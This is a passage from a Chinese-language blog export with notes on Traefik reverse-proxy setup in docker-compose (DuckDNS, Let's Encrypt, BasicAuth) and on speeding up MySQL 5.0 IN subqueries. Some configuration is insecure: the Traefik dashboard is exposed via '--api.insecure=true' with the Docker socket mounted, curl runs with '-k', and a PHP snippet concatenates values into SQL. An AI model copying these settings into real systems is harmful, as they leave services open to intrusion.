duckdns</span></span><br><span class=\"line\">    <span class=\"comment\"># if you have a static IP, yu can comment this out</span></span><br><span class=\"line\">    <span class=\"comment\"># using busybox due to it having an image for almost every platform</span></span><br><span class=\"line\"><span class=\"attr\">    image:</span> <span class=\"string\">armhf/ubuntu</span></span><br><span class=\"line\"><span class=\"attr\">    command:</span> <span class=\"string\">/bin/sh</span> <span class=\"bullet\">-c</span> <span class=\"string\">\"apt update -y &amp;&amp; apt install curl -y &amp;&amp; while true; do echo url=\\\"https://www.duckdns.org/update?domains=$&#123;DUCKDNS_SUBDOMAIN&#125;&amp;token=$&#123;DUCKDNS_TOKEN&#125;\\\" | curl -k -o duck.log -K -; sleep 300; done\"</span></span><br><span class=\"line\"><span class=\"attr\">    restart:</span> <span class=\"string\">always</span></span><br><span class=\"line\"><span class=\"attr\">    labels:</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">\"traefik.enable=false\"</span></span><br><span class=\"line\"><span class=\"attr\">  traefik:</span></span><br><span class=\"line\"><span class=\"attr\">    image:</span> <span class=\"string\">traefik</span></span><br><span class=\"line\"><span class=\"attr\">    command:</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">\"--api.insecure=true\"</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">\"--providers.docker\"</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">\"--entrypoints.web.address=:80\"</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">\"--entrypoints.web-secure.address=:443\"</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">\"--certificatesresolvers.letsencrypt.acme.dnschallenge=true\"</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">\"--certificatesresolvers.letsencrypt.acme.email=xxxxx@gmail.com\"</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">\"--certificatesresolvers.letsencrypt.acme.storage=acme.json\"</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">\"--certificatesresolvers.letsencrypt.acme.dnschallenge.provider=duckdns\"</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">\"--certificatesresolvers.letsencrypt.acme.dnschallenge.delaybeforecheck=0\"</span></span><br><span class=\"line\"><span class=\"attr\">    ports:</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">\"80:80\"</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">\"443:443\"</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">\"8080:8080\"</span></span><br><span class=\"line\"><span class=\"attr\">    volumes:</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">/var/run/docker.sock:/var/run/docker.sock</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">./acme.json:/acme.json</span></span><br><span class=\"line\"><span class=\"attr\">    networks:</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">traefik_network</span></span><br><span class=\"line\"><span class=\"attr\">    environment:</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">DUCKDNS_TOKEN=$&#123;DUCKDNS_TOKEN&#125;</span></span><br><span class=\"line\"><span class=\"attr\">    labels:</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">\"traefik.enable=false\"</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">\"traefik.http.routers.traefik.tls=true\"</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">\"traefik.http.routers.traefik.tls.certresolver=letsencrypt\"</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">\"traefik.http.routers.traefik.tls.domains[0].main=$&#123;DUCKDNS_SUBDOMAIN&#125;.duckdns.org\"</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">\"traefik.http.routers.traefik.tls.domains[0].sans=*.$&#123;DUCKDNS_SUBDOMAIN&#125;.duckdns.org,$&#123;DUCKDNS_SUBDOMAIN&#125;.duckdns.org\"</span></span><br><span class=\"line\"><span class=\"attr\">networks:</span></span><br><span class=\"line\"><span class=\"attr\">  traefik_network:</span></span><br><span class=\"line\"><span class=\"attr\">    external:</span> <span class=\"literal\">true</span></span><br></pre></td></tr></table></figure>\n<p>這邊有個小技巧，使用搭配 .env<br>可以用 docker-compose config 看看有沒有設定到</p>\n<p>certresolver 的 letsencrypt 是看自己命名的名子certificatesresolvers.<code>letsencrypt</code>.acme.dnschallenge</p>\n<p>whoami</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">version: <span class=\"string\">\"2\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">services:</span><br><span class=\"line\">  whoami:</span><br><span class=\"line\">    image: hypriot/rpi-whoami</span><br><span class=\"line\">    networks:</span><br><span class=\"line\">        - traefik_network</span><br><span class=\"line\">    environment:</span><br><span class=\"line\">      - constraint:hypriot.hierarchy!=leader</span><br><span class=\"line\">      - PORT=8000</span><br><span class=\"line\">    labels:</span><br><span class=\"line\">      - <span class=\"string\">\"traefik.backend=whoami\"</span></span><br><span class=\"line\">      - <span class=\"string\">\"traefik.http.routers.whoami.rule=Host(`whoami.xxxxx`) || PathPrefix(`/whoami`)\"</span></span><br><span class=\"line\">      - <span class=\"string\">\"traefik.http.routers.whoami.tls=true\"</span></span><br><span class=\"line\">      - <span class=\"string\">\"traefik.http.services.whoami.loadbalancer.server.port=8000\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">networks:</span><br><span class=\"line\">  traefik_network:</span><br><span class=\"line\">    external: <span class=\"literal\">true</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"問題整理\"><a href=\"#問題整理\" class=\"headerlink\" title=\"問題整理\"></a>問題整理</h3><h4 id=\"port-is-missing\"><a href=\"#port-is-missing\" class=\"headerlink\" title=\"port is missing\"></a>port is missing</h4><p>traefik_1          | time=”2020-10-18T12:15:24Z” level=error msg=”service \\”seafile\\” error: port is missing” providerName=docker container=seafile-7d40e43962df0ec1ca3af66d553c7ae5b81364497bb5f4f2c77597c95d210370</p>\n<p><del>要開隨一 port? 就能解決</del></p>\n<p>原本是用 traefik.http.services.seafile.loadbalancer.server.port=80<br><del><strong>但可能也不是應該用這種方式</strong> 有更好方式再補充</del><br>去控制 port 不是用 traefik.port</p>\n<p>查看官方文件<a href=\"https://doc.traefik.io/traefik/providers/docker/\" target=\"_blank\" rel=\"noopener\">Docker - Traefik</a></p>\n<blockquote>\n<p>Ports detection works as follows:</p>\n<p>   If a container exposes only one port, then Traefik uses this port for private communication.<br>   If a container exposes multiple ports, or does not expose any port, then you must manually specify which port Traefik should use for communication by using the label traefik.http.services._service_name_.loadbalancer.server.port (Read more on this label in the dedicated section in routing).</p>\n</blockquote>\n<p>exposes 就是 docker 對外設定的 port</p>\n<figure class=\"highlight dockerfile\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">EXPOSE</span> &lt;port&gt; [&lt;port&gt;/&lt;protocol&gt;...]</span><br></pre></td></tr></table></figure>\n<p>難怪…，nextcloud seafile 都需要設定 traefik.http.services.seafile.loadbalancer.server.port=80</p>\n<h4 id=\"https-導向問題\"><a href=\"#https-導向問題\" class=\"headerlink\" title=\"https 導向問題\"></a>https 導向問題</h4><p>進去 nextcloud https 網站時候<br>會發現進不去</p>\n<p>內層服務強制 https 取消</p>\n<h4 id=\"Container-取消關聯\"><a href=\"#Container-取消關聯\" class=\"headerlink\" title=\"Container 取消關聯\"></a>Container 取消關聯</h4><p><a href=\"https://doc.traefik.io/traefik/v1.4/configuration/backends/docker/\" target=\"_blank\" rel=\"noopener\">Backend: Docker - Træfik</a></p>\n<p>docker run -d -p 8000:8000 -p 9000:9000 -l “traefik.enable=false” –name=portainer –restart=always -v /var/run/docker.sock:/var/run/docker.sock -v portainer_data:/data portainer/portainer-ce:alpine@sha256:f13f14be723c848e119fa8d85c932dbcc0cbe3cfe09e784ceb09adefa248ccd1</p>\n<h4 id=\"HTTPS-redirection-80-to-443\"><a href=\"#HTTPS-redirection-80-to-443\" class=\"headerlink\" title=\"HTTPS redirection (80 to 443)\"></a>HTTPS redirection (80 to 443)</h4><p>待確認</p>\n<p>–entrypoints.web.address=:80<br>–entrypoints.web.http.redirections.entryPoint.to=web-secure<br>–entrypoints.web.http.redirections.entryPoint.scheme=https<br>–entrypoints.web-secure.address=:443</p>\n<p>這邊要注意 entrypoints.<code>web-secure</code>.address 裡面的命名</p>\n<h4 id=\"同時使用-http-和-https-反向代理\"><a href=\"#同時使用-http-和-https-反向代理\" class=\"headerlink\" title=\"同時使用 http 和 https 反向代理\"></a>同時使用 http 和 https 反向代理</h4><p>用 nginx , apache 相關反向代理<br>相信不用處理是否要 http , https<br>預設就可以了</p>\n<p>但我發現這邊不行<br>後來看了官網文件<a href=\"https://doc.traefik.io/traefik/routing/routers/#general\" target=\"_blank\" rel=\"noopener\">Routers - Traefik</a></p>\n<blockquote>\n<p>Routers for HTTP &amp; HTTPS</p>\n<p>If you need to define the same route for both HTTP and HTTPS requests, you will need to define two different routers: one with the tls section, one without.</p>\n</blockquote>\n<figure class=\"highlight\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">## Dynamic configuration</span></span><br><span class=\"line\"><span class=\"section\">[http.routers]</span></span><br><span class=\"line\"><span class=\"section\">  [http.routers.my-https-router]</span></span><br><span class=\"line\">    rule = \"Host(`foo-domain`) &amp;&amp; Path(`/foo-path/`)\"</span><br><span class=\"line\">    service = \"service-id\"</span><br><span class=\"line\">    <span class=\"comment\"># will terminate the TLS request</span></span><br><span class=\"line\"><span class=\"section\">    [http.routers.my-https-router.tls]</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"section\">  [http.routers.my-http-router]</span></span><br><span class=\"line\">    rule = \"Host(`foo-domain`) &amp;&amp; Path(`/foo-path/`)\"</span><br><span class=\"line\">    service = \"service-id\"</span><br></pre></td></tr></table></figure>\n<p>簡單說就是要寫兩個 router </p>\n<p>Docker Label 設定方法</p>\n<figure class=\"highlight yml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">labels:</span></span><br><span class=\"line\"><span class=\"bullet\">  -</span> <span class=\"string\">\"traefik.backend=whoami\"</span></span><br><span class=\"line\"><span class=\"bullet\">  -</span> <span class=\"string\">\"traefik.http.routers.whoami.rule=Host(`whoami.ooo.duckdns.org`) || PathPrefix(`/whoami`)\"</span></span><br><span class=\"line\"><span class=\"bullet\">  -</span> <span class=\"string\">\"traefik.port=8000\"</span></span><br><span class=\"line\">  <span class=\"comment\">#- \"traefik.protocol=http\" default http</span></span><br><span class=\"line\"><span class=\"bullet\">  -</span> <span class=\"string\">\"traefik.http.routers.whoami-https.rule=Host(`whoami.ooo.duckdns.org`)\"</span></span><br><span class=\"line\"><span class=\"bullet\">  -</span> <span class=\"string\">\"traefik.http.routers.whoami-https.tls=true\"</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"traefik-docker-設定小記\"><a href=\"#traefik-docker-設定小記\" class=\"headerlink\" title=\"traefik docker 設定小記\"></a>traefik docker 設定小記</h4><p>這邊主要是 traefik 的 docker 設定</p>\n<p>提幾個我覺得<del>驚奇</del>重要</p>\n<ol>\n<li><p>endpoint 指定 docker socket file 路徑<a href=\"https://doc.traefik.io/traefik/providers/docker/#endpoint\" target=\"_blank\" rel=\"noopener\">Docker - Traefik</a></p>\n</li>\n<li><p>exposedByDefault</p>\n</li>\n</ol>\n<p>單一 port 可以不用設定連到是因為這個關係<br>預設true</p>\n<ol start=\"3\">\n<li>defaultRule <a href=\"https://doc.traefik.io/traefik/providers/docker/#defaultrule\" target=\"_blank\" rel=\"noopener\">Docker - Traefik</a></li>\n</ol>\n<p>Default=Host(<code></code>) </p>\n<p>建立 docker 最自動產生 docker router 名稱原來是這邊來的</p>\n<h4 id=\"設定-BaseAuth\"><a href=\"#設定-BaseAuth\" class=\"headerlink\" title=\"設定 BaseAuth\"></a>設定 BaseAuth</h4><h5 id=\"產生-帳號-密碼\"><a href=\"#產生-帳號-密碼\" class=\"headerlink\" title=\"產生 帳號/密碼\"></a>產生 帳號/密碼</h5><h1 id=\"Note-when-used-in-docker-compose-yml-all-dollar-signs-in-the-hash-need-to-be-doubled-for-escaping\"><a href=\"#Note-when-used-in-docker-compose-yml-all-dollar-signs-in-the-hash-need-to-be-doubled-for-escaping\" class=\"headerlink\" title=\"Note: when used in docker-compose.yml all dollar signs in the hash need to be doubled for escaping.\"></a>Note: when used in docker-compose.yml all dollar signs in the hash need to be doubled for escaping.</h1><h1 id=\"To-create-user-password-pair-it’s-possible-to-use-this-command\"><a href=\"#To-create-user-password-pair-it’s-possible-to-use-this-command\" class=\"headerlink\" title=\"To create user:password pair, it’s possible to use this command:\"></a>To create user:password pair, it’s possible to use this command:</h1><h1 id=\"echo-htpasswd-nb-user-password-sed-e-s-g\"><a href=\"#echo-htpasswd-nb-user-password-sed-e-s-g\" class=\"headerlink\" title=\"echo $(htpasswd -nb user password) | sed -e s/\\$/\\$\\$/g\"></a>echo $(htpasswd -nb user password) | sed -e s/\\$/\\$\\$/g</h1><ul>\n<li><a href=\"https://doc.traefik.io/traefik/middlewares/basicauth/\" target=\"_blank\" rel=\"noopener\">BasicAuth - Traefik</a></li>\n<li><a href=\"https://tool.oschina.net/htpasswd\" target=\"_blank\" rel=\"noopener\">在线 htpasswd 生成器</a></li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">- &quot;traefik.http.routers.router1.middlewares=test-auth@docker&quot;</span><br><span class=\"line\">- &quot;traefik.http.middlewares.test-auth.basicauth.users=test:$$apr1$$wB4YY5ua$$EocdCl08mI3Pk.6nItqZC/,test2:$$apr1$$2n2YpbTP$$c.FBjTJcfU0FkFZ4u912G/&quot;</span><br></pre></td></tr></table></figure>\n<h5 id=\"從檔案讀取帳號密碼\"><a href=\"#從檔案讀取帳號密碼\" class=\"headerlink\" title=\"從檔案讀取帳號密碼\"></a>從檔案讀取帳號密碼</h5><figure class=\"highlight yml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">labels:</span></span><br><span class=\"line\"><span class=\"bullet\">  -</span> <span class=\"string\">\"traefik.http.middlewares.test-auth.basicauth.usersfile=/path/to/my/usersfile\"</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">test:$apr1$H6uskkkW$IgXLP6ewTrSuBkTrqE8wj/</span><br><span class=\"line\">test2:$apr1$d9hr9HBB$4HxwgUir3HP4EsggP/QNo0</span><br></pre></td></tr></table></figure>\n<h4 id=\"openvpn-憑證\"><a href=\"#openvpn-憑證\" class=\"headerlink\" title=\"openvpn 憑證\"></a>openvpn 憑證</h4><p>PiVPN </p>\n<p><a href=\"https://medium.com/@ncsayeed/guide-openvpn-access-server-lets-encrypt-certbot-d8b65e8fdef\" target=\"_blank\" rel=\"noopener\">OpenVPN Access Server &amp; Let’s Encrypt | Medium</a><br><a href=\"https://github.com/SnowMB/traefik-certificate-extractor\" target=\"_blank\" rel=\"noopener\">SnowMB/traefik-certificate-extractor: Tool to extract Let’s Encrypt certificates from Traefik’s ACME storage file.</a><br><a href=\"https://stackoverflow.com/questions/47218529/store-traefik-lets-encrypt-certificates-not-as-json\" target=\"_blank\" rel=\"noopener\">Store traefik let’s encrypt certificates not as json - Stack Overflow</a><br><a href=\"https://gist.github.com/HighMacGuy/3cf42ce21d3bd923f2440f9938e2f664\" target=\"_blank\" rel=\"noopener\">OpenVPN Access Server Letsencrypt</a><br><a href=\"https://github.com/ldez/traefik-certs-dumper\" target=\"_blank\" rel=\"noopener\">ldez/traefik-certs-dumper: Dump ACME data from Traefik to certificates</a><br><a href=\"https://juriansluiman.nl/posts/openvpn-with-traefik-2.2/\" target=\"_blank\" rel=\"noopener\">OpenVPN with Traefik 2.2 using UDP · Jurian Sluiman</a></p>\n<ul>\n<li><a href=\"https://alex.thom.ae/2020/09/19/traefik-openvpn-docker-swarm/\" target=\"_blank\" rel=\"noopener\">Traefik, OpenVPN and Direct Container Connections on Docker Swarm</a></li>\n<li><a href=\"https://github.com/authelia/authelia\" target=\"_blank\" rel=\"noopener\">authelia/authelia: The Single Sign-On Multi-Factor portal for web apps</a></li>\n<li><a href=\"https://gist.github.com/darth-veitcher/93acda9617bab3e1de0264cebf4637fc\" target=\"_blank\" rel=\"noopener\">Traefik v2.0 with Cloudflare Wildcard and OpenVPN</a></li>\n<li><a href=\"https://my.oschina.net/u/4592353/blog/4434556\" target=\"_blank\" rel=\"noopener\">当我有一台服务器时我做了什么 - 山月行的个人空间 - OSCHINA - 中文开源技术交流社区</a></li>\n<li><a href=\"https://blog.longwin.com.tw/2014/10/ssh-google-2-factor-authentication-2014/\" target=\"_blank\" rel=\"noopener\">Linux SSH 加上 Google 兩階段認證服務檢核 | Tsung’s Blog</a></li>\n<li><a href=\"https://shazi.info/ubuntu-16-04-%E5%AE%89%E8%A3%9D-openvpn-%E5%8A%A0%E4%B8%8A-mfa-%E9%A9%97%E8%AD%89/\" target=\"_blank\" rel=\"noopener\">Ubuntu 16.04 安裝 OpenVPN 加上 MFA 驗證 – Mr. 沙先生</a></li>\n<li><a href=\"https://tsai.it/archives/2018/08/%E7%B5%82%E6%96%BC%E8%A7%A3%E6%B1%BA-linux-%E4%B8%8A-vpn-%E9%80%A3%E7%B7%9A-ssl-%E9%80%A3%E7%B7%9A%E9%8C%AF%E8%AA%A4%E7%9A%84%E5%95%8F%E9%A1%8C/\" target=\"_blank\" rel=\"noopener\">終於解決 Linux 上 VPN 連線 SSL 連線錯誤的問題 | Tsai I-ta’s Blog</a></li>\n</ul>\n<h4 id=\"access-log\"><a href=\"#access-log\" class=\"headerlink\" title=\"access log\"></a>access log</h4><p>cli</p>\n<p>–accesslog=true</p>\n<p><a href=\"https://doc.traefik.io/traefik/observability/access-logs/\" target=\"_blank\" rel=\"noopener\">Access Logs - Traefik</a></p>\n<h4 id=\"log\"><a href=\"#log\" class=\"headerlink\" title=\"log\"></a>log</h4><p><a href=\"https://juejin.im/post/6844904117429600270\" target=\"_blank\" rel=\"noopener\">一文搞懂Traefik的可观测性</a></p>\n","categories":["Linux"],"tags":["traefik"]},{"title":"在MySQL5.0查詢大量資料使用IN子查詢好慢(優化方法)","url":"/blog/2018/05/15/%E5%9C%A8MySQL5-0%E6%9F%A5%E8%A9%A2%E5%A4%A7%E9%87%8F%E8%B3%87%E6%96%99%E4%BD%BF%E7%94%A8IN%E5%AD%90%E6%9F%A5%E8%A9%A2%E5%A5%BD%E6%85%A2/","content":"<p>最近使用有一個程式SQL會跑3秒<br>程式共花了1x秒鐘<br>想把他cost 時間降下來<br>但IN方法不知道為什麼那麼慢<br>就簡單研究有沒有更好的寫法</p>\n<a id=\"more\"></a>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">SELECT</span>  ptm.tablename</span><br><span class=\"line\"><span class=\"keyword\">FROM</span> <span class=\"string\">`secord_big_table`</span> ptm</span><br><span class=\"line\"><span class=\"keyword\">WHERE</span> ptm.playlistID  <span class=\"keyword\">IN</span></span><br><span class=\"line\">    (<span class=\"keyword\">SELECT</span> stm.playlistID</span><br><span class=\"line\">     <span class=\"keyword\">FROM</span> <span class=\"string\">`first_big_table`</span> stm </span><br><span class=\"line\">     <span class=\"keyword\">WHERE</span> stm.sid <span class=\"keyword\">IN</span></span><br><span class=\"line\">         (<span class=\"keyword\">SELECT</span> <span class=\"keyword\">sid</span></span><br><span class=\"line\">          <span class=\"keyword\">FROM</span> <span class=\"string\">`small_table`</span></span><br><span class=\"line\">          <span class=\"keyword\">WHERE</span> as_id = <span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">AND</span> item_no = <span class=\"number\">1</span>))</span><br></pre></td></tr></table></figure>\n<p>執行<code>explain</code>看一下狀態…<br>first_big_table是掃全表的樣子</p>\n<p>暫時用LIMIT和=解決問題<br><figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">SELECT</span>  ptm.tablename</span><br><span class=\"line\"><span class=\"keyword\">FROM</span> <span class=\"string\">`secord_big_table`</span> ptm</span><br><span class=\"line\"><span class=\"keyword\">WHERE</span> ptm.playlistID  =</span><br><span class=\"line\">   (<span class=\"keyword\">SELECT</span> stm.playlistID</span><br><span class=\"line\">     <span class=\"keyword\">FROM</span> <span class=\"string\">`first_big_table`</span> stm </span><br><span class=\"line\">     <span class=\"keyword\">WHERE</span> stm.sid <span class=\"keyword\">IN</span></span><br><span class=\"line\">         (<span class=\"keyword\">SELECT</span> <span class=\"keyword\">sid</span></span><br><span class=\"line\">          <span class=\"keyword\">FROM</span> <span class=\"string\">`small_table`</span></span><br><span class=\"line\">          <span class=\"keyword\">WHERE</span> as_id = <span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">AND</span> item_no = <span class=\"number\">4</span>)</span><br><span class=\"line\">         <span class=\"keyword\">LIMIT</span> <span class=\"number\">0</span>,<span class=\"number\">1</span></span><br><span class=\"line\">         )</span><br></pre></td></tr></table></figure></p>\n<p><strong>事後發現</strong><br>這不是我之前寫的<code>非相關子查詢</code>嗎<br><a href=\"http://malagege.logdown.com/posts/4690995-sql-subquery-notes\" target=\"_blank\" rel=\"noopener\">SQL子查詢筆記(相關子查詢/非相關子查詢) « 進擊的程式新手</a><br>照到理沒理由這麼慢阿…<br>好啦，這時候突然回想起來<a href=\"https://www.facebook.com/groups/616369245163622\" target=\"_blank\" rel=\"noopener\">Backend 台灣 (Backend Tw)</a>裡面的T大常常批評MySQL<br><del>在絕望下</del>尋找新方法</p>\n<h2 id=\"exists優化IN語句\"><a href=\"#exists優化IN語句\" class=\"headerlink\" title=\"exists優化IN語句\"></a>exists優化IN語句</h2><blockquote>\n<p>第一種格式是使用IN操作符：<br>… where column in(select * from … where …);<br>第二種格式是使用EXIST操作符：<br>… where exists (select ‘X’ from …where …);<br>我相信絕大多數人會使用第一種格式，因為它比較容易編寫，而實際上第二種格式要遠比第一種格式的效率高。在Oracle中可以幾乎將所有的IN操作符子查詢改寫為使用EXISTS的子查詢。<br>第二種格式中，子查詢以‘select ‘X’開始。運用EXISTS子句不管子查詢從表中抽取什麼資料它只查看where子句。這樣優化器就不必遍曆整個表而僅根據索引就可完成工作（這裏假定在where語句中使用的列存在索引）。相對於IN子句來說，EXISTS使用相連子查詢，構造起來要比IN子查詢困難一些。<br>通過使用EXIST，Oracle系統會首先檢查主查詢，然後運行子查詢直到它找到第一個匹配項，這就節省了時間。Oracle系統在執行IN子查詢時，首先執行子查詢，並將獲得的結果列表存放在在一個加了索引的臨時表中。在執行子查詢之前，系統先將主查詢掛起，待子查詢執行完畢，存放在臨時表中以後再執行主查詢。這也就是使用EXISTS比使用IN通常查詢速度快的原因<br><a href=\"http://blog.xuite.net/javax/programmer/3505144-%5B%E6%95%88%E8%83%BD%5DSQL%E8%AA%9E%E5%8F%A5%E6%80%A7%E8%83%BD%E8%AA%BF%E6%95%B4%E5%8E%9F%E5%89%87+\" target=\"_blank\" rel=\"noopener\">[效能]SQL語句性能調整原則 @ Programmer Developer Notebook :: 隨意窩 Xuite日誌</a></p>\n</blockquote>\n<h2 id=\"實戰MySQL5-0上面\"><a href=\"#實戰MySQL5-0上面\" class=\"headerlink\" title=\"實戰MySQL5.0上面\"></a>實戰MySQL5.0上面</h2><p>有在<a href=\"http://eeluck.pixnet.net/blog/post/27559378-in%E5%92%8Cexists%E7%9A%84%E5%B7%AE%E7%95%B0\" target=\"_blank\" rel=\"noopener\">IN和EXISTS的差異 @ 芊芊的窩 :: 痞客邦 ::</a>改成exists語句</p>\n<blockquote>\n<p>而假如外部的表格A是相對的儲存大量資料，則採用第一個方法IN的效率將會比較好，假如你使用EXISTS，則除了會對A這個大表格進行全面掃瞄外，還會一筆一筆讀取所有A的資料列，效能自然較差。<br>簡單的一句話，外大內小=IN，外小內大=EXISTS，這是一個實用的概略評估方法，在大部分的情況下是適用的。</p>\n</blockquote>\n<p>我覺得優化原因是<a href=\"https://github.com/TritonHo/slides/blob/master/Taipei%202017-10%20talk/SQL_report_v2.pdf\" target=\"_blank\" rel=\"noopener\">slides/SQL_report_v2.pdf at master · TritonHo/slides</a>的Query Optimizer淺談</p>\n<p>不過我修改<br><figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">SELECT</span> stm.playlistID</span><br><span class=\"line\">     <span class=\"keyword\">FROM</span> <span class=\"string\">`first_big_table`</span> stm </span><br><span class=\"line\">     <span class=\"keyword\">WHERE</span> <span class=\"keyword\">exists</span></span><br><span class=\"line\">         (<span class=\"keyword\">SELECT</span> <span class=\"string\">'x'</span></span><br><span class=\"line\">          <span class=\"keyword\">FROM</span> <span class=\"string\">`small_table`</span></span><br><span class=\"line\">          <span class=\"keyword\">WHERE</span> as_id = <span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">AND</span> item_no = <span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">AND</span> stm.sid <span class=\"keyword\">IN</span> <span class=\"keyword\">sid</span>)</span><br></pre></td></tr></table></figure></p>\n<p>還是沒用…</p>\n<p>最後還是想到<a href=\"https://www.facebook.com/groups/616369245163622\" target=\"_blank\" rel=\"noopener\">Backend 台灣 (Backend Tw)</a>裡面的T大常常批評MySQL</p>\n<h2 id=\"子查詢語句注意問題\"><a href=\"#子查詢語句注意問題\" class=\"headerlink\" title=\"子查詢語句注意問題\"></a>子查詢語句注意問題</h2><p> <a href=\"http://seanphpbook.blogspot.tw/2015/08/mysql.html\" target=\"_blank\" rel=\"noopener\">謝晒的PHP網頁設計: [MYSQL] 多層式子查詢 效能注意事項</a></p>\n<h2 id=\"用程式組IN字串就PK\"><a href=\"#用程式組IN字串就PK\" class=\"headerlink\" title=\"用程式組IN字串就PK\"></a>用程式組IN字串就PK</h2><p>今天實驗結果，在MYSQL5.0使用子查詢IN改寫exists速度還是很慢<br>然後發現跟我之前寫的非相關子查詢速度有不一樣<br>但是改成IN(‘xxxx’,’oooo’,’fffff’)<br>速度就比較快<br>所以目前先用程式拆兩段</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?</span></span><br><span class=\"line\">        $array_in = <span class=\"keyword\">array</span>();</span><br><span class=\"line\">        <span class=\"keyword\">foreach</span> ($in_sid <span class=\"keyword\">as</span>  $value) &#123;</span><br><span class=\"line\">            array_push($array_in,$value[<span class=\"string\">'sid'</span>]);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"> $sql = <span class=\"string\">\"select xxx from  ooo where oo IN (\"</span> .implode( <span class=\"string\">\",\"</span> , $array_in).<span class=\"string\">\")\"</span>;</span><br></pre></td></tr></table></figure>\n<h2 id=\"柳暗花明又一村\"><a href=\"#柳暗花明又一村\" class=\"headerlink\" title=\"柳暗花明又一村\"></a>柳暗花明又一村</h2><p>這樣跑子查詢竟然吃到key了…..<br>但不知道這樣跑好不好</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">SELECT</span> b.sid,</span><br><span class=\"line\">  (<span class=\"keyword\">SELECT</span> ptm.tablename</span><br><span class=\"line\">   <span class=\"keyword\">FROM</span> <span class=\"string\">`social`</span>.<span class=\"string\">`secord_big_table`</span> ptm</span><br><span class=\"line\">   <span class=\"keyword\">WHERE</span> ptm.playlistID = b.a)</span><br><span class=\"line\"><span class=\"keyword\">FROM</span></span><br><span class=\"line\">  (<span class=\"keyword\">SELECT</span> g.sid,</span><br><span class=\"line\"></span><br><span class=\"line\">     (<span class=\"keyword\">SELECT</span> stm.playlistID</span><br><span class=\"line\">      <span class=\"keyword\">FROM</span> <span class=\"string\">`social`</span>.<span class=\"string\">`first_big_table`</span> stm</span><br><span class=\"line\">      <span class=\"keyword\">WHERE</span> stm.sid = g.sid) <span class=\"keyword\">AS</span> a</span><br><span class=\"line\">   <span class=\"keyword\">FROM</span> <span class=\"string\">`pay`</span>.<span class=\"string\">`activity_guess_item`</span> g</span><br><span class=\"line\">   <span class=\"keyword\">WHERE</span> as_id = <span class=\"number\">1</span></span><br><span class=\"line\">     <span class=\"keyword\">AND</span> item_no = <span class=\"number\">4</span>) <span class=\"keyword\">AS</span> b</span><br></pre></td></tr></table></figure>\n<p>雖然程式只需要抓到一筆<br>但上面方法可以抓到多筆<br>效能能吃到key</p>\n<p>算是另類解法 </p>\n<h2 id=\"INNER-JOIN解決方法\"><a href=\"#INNER-JOIN解決方法\" class=\"headerlink\" title=\"INNER JOIN解決方法\"></a>INNER JOIN解決方法</h2><p>最後網路爬到用INNER JOIN 優化<br><a href=\"http://www.cnblogs.com/zhengyun_ustc/p/slowquery3.html\" target=\"_blank\" rel=\"noopener\">[慢查优化]慎用MySQL子查询，尤其是看到DEPENDENT SUBQUERY标记时 - 旁观者 - 博客园</a><br><a href=\"http://codingstandards.iteye.com/blog/1344833\" target=\"_blank\" rel=\"noopener\">MySQL性能优化小记：MySQL子查询很慢的问题 - Bash @ Linux - ITeye博客</a></p>\n<p><code>`</code>sql<br>SELECT stm.tablename<br>FROM<br>    (SELECT ptm.playlistID<br>     FROM <code>secord_big_table</code> ptm<br>     INNER JOIN <code>smaill_table</code> g ON ptm.sid = g.sid<br>     WHERE as_id = 1<br>       AND item_no = 4 ) p<br>INNER 